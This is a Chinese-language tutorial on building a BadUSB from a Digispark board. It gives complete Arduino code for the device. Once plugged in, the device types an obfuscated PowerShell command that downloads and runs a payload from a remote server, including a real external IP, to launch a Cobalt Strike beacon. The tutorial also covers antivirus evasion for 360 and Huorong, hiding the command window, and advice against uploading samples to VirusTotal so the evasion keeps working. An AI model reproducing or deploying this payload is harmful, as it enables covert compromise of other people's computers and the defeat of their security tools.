# 0x01 准备阶段

  1. 购买BadUsb，我购买的是Digispark。

![](./img/5478808526585500539.png)

  1. 安装Arduino IDE

  2. 配置Arduino IDE ，添加开发板，安装驱动。

参考链接：<https://www.jianshu.com/p/b33d61fc2678>

  3. 掌握Digispark编程语法。（语法较简单，可以边查边写）

至此，BadUsb和开发环境均已配置完毕，可以开始编写代码。

# 0x02 编写代码

编写代码前，我们首先要了解BadUsb的大致原理，本质上就是插入电脑后可以模拟键盘输入，既然是模拟键盘输入，我们可以先写出一个大致的代码框架。

    
    
    #include "DigiKeyboard.h"
    #define MOD_SHIFT_LEFT      (1<<1)
    #define MOD_CONTROL_LEFT    (1<<0)
    #define KEY_ENTER   40
    #define KEY_CAPS_LOCK 0x39
    
    void setup() {
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("cmd")); //输入cmd
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
    DigiKeyboard.delay(500);
    //后面输入恶意代码
    }
    
    void loop() {
    }

这段代码先声明了一些键盘按键代表的字符，然后通过键盘唤起CMD。其中插入BadUsb后间隔2秒开始执行程序，每次输入字符后都间隔0.5s。

代码框架编写完成后，就可以开始构造我们的免杀恶意代码了。

要想通过键盘输入上线的我们的C2服务器，有2种思路。通过powershell命令上线 或 通过命令行文件下载恶意文件上线。

  1. 文件下载上线

考虑到免杀问题，certutil这些常见的命令几乎被所有杀软拦截，网上公开的绕过方法（例如双写certutil）可以绕过火绒，但360无法绕过。

文件成功下载后，恶意文件的免杀也具有一定局限性，所以如果考虑免杀，那么通过文件下载这种模式来实现BadUsb上线存在很大难度。

  2. powershell命令上线

​ powershell上线也分两种方式

​ (1)通过ps1文件上线

![](./img/3180725077658435943.png)

ps1文件免杀效果好，Github有很多针对ps1文件的免杀项目，可以轻松绕过国内主流杀软。

![](./img/312871899013150414.png)

但ps1文件庞大的代码量又带来了一个问题，在我们编写完成代码框架后，使用Arduino
IDE进行编译，提示“当前已使用了45%的存储空间”，而如果我们将ps1文件中的全部代码编译，则会存在闪存空间不足的问题。

![](./img/2781478859957386436.png)

![](./img/1880720722595591762.png)

有2种办法解决这个问题，使用钞能力购买闪存更大的开发板，或精简我们的ps1文件内容。至此通过ps1文件上线这个思路也在这里断了。

​ (2)通过web服务上线

![](./img/7307178529552922054.png)

通过这种方法生成的payload较为精简，不存在闪存不足的问题，只需要针对性的做一下免杀即可。

这里给出我免杀的方法，设置别名+^字符间隔+加号拼接字符串。

    
    
    cmd /c echo set-alias -name xz -value IEX;x^z (New-Object "NeT.WeBClienT").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19'+'2.168.1.1'+'/a') | p^o^w^e^r^s^h^e^l^l -
这里没有添加后台运行powershell的参数，因为hidden参数会影响免杀效果，这样的运行方式实测可以绕过火绒和360。

那么代码就算是初步完成了，如下。

    
    
    #include "DigiKeyboard.h"
    #define MOD_SHIFT_LEFT      (1<<1)
    #define MOD_CONTROL_LEFT    (1<<0)
    #define KEY_ENTER   40
    #define KEY_CAPS_LOCK 0x39
    
    void setup() {
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r
    DigiKeyboard.delay(500);
    
    // powershell上线 免杀火绒360 窗口不隐藏  需要点鼠标杀软放行
    DigiKeyboard.print(F("cmd")); //输入cmd
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("cmd /c echo set-alias -name xz -value IEX;x^z (New-Object "NeT.WeBClienT").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19'+'2.168.1.1'+'/a') | p^o^w^e^r^s^h^e^l^l -")); //POWERSHELL上线
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
    }
    
    void loop() {
    }

# 0x03 代码优化

将写好的代码编译并烧录进BadUsb后，其实效果并没有那么理想，有如下几个问题：

1、部分电脑存在默认中文输入法，在模拟键盘输入的过程中会存在中文输入，未达到预期输入的内容

解决方案：开始模拟键盘输入前锁定大小写，相应的我们的免杀代码也要做出对应的大小写修改。

    
    
    DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK); //锁定大小写，防止默认中文输入法
    
    DigiKeyboard.print(F("cmd /c echo set-alias -name xz -value IEX;x^z (New-Object \"NeT.WeBClienT\").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19'+'2.168.1.1'+'/A’) | p^o^w^e^r^s^h^e^l^l -")); //POWERSHELL上线 路径大小写都要有a A

2、powershell运行完毕后，桌面留下一个黑框非常显眼。

解决方案：模拟键盘输入wind+d返回桌面隐藏cmd黑框，上线cs后立即迁移进程即可。

最终优化后的代码如下

    
    
    #include "DigiKeyboard.h"
    #define MOD_SHIFT_LEFT      (1<<1)
    #define MOD_CONTROL_LEFT    (1<<0)
    #define KEY_ENTER   40
    #define KEY_CAPS_LOCK 0x39
    
    void setup() {
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK); //锁定大小写，防止默认中文输入法
    DigiKeyboard.delay(500);
    
    // powershell上线 免杀火绒360 窗口不隐藏  需要点鼠标杀软放行
    DigiKeyboard.print(F("cmd")); //输入cmd
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("cmd /c echo set-alias -name xz -value IEX;x^z (New-Object \"NeT.WeBClienT\").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://4'+'3.138.111.78'+'/A') | p^o^w^e^r^s^h^e^l^l -")); //POWERSHELL上线 路径大小写都要有a A
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT); //win+d
    }
    
    void loop() {
    }

至此，实现了免杀火绒360 BadUsb即插即上线CS。

# 0x04 结语

这篇文章是在我能力范围之内想出的BadUsb免杀上线的思路，希望能给各位师傅提供思路，如果师傅有更为新颖高效的思路也欢迎交流。

同时免杀不易，请珍惜当前可用的免杀方式，不要放在微步、VT等平台检测免杀效果。

最后附上参考链接：

<https://www.jianshu.com/p/b33d61fc2678>

[https://lzy-wi.github.io/2018IAMHUAPIDAN！/06/12/badusb/](https://lzy-wi.github.io/2018/06/12/badusb/)

<https://www.cnblogs.com/binglicheng/p/11615535.html>

<https://blog.csdn.net/qq_34341458/article/details/123368269>

<https://blog.csdn.net/weixin_52444045/article/details/126432290>

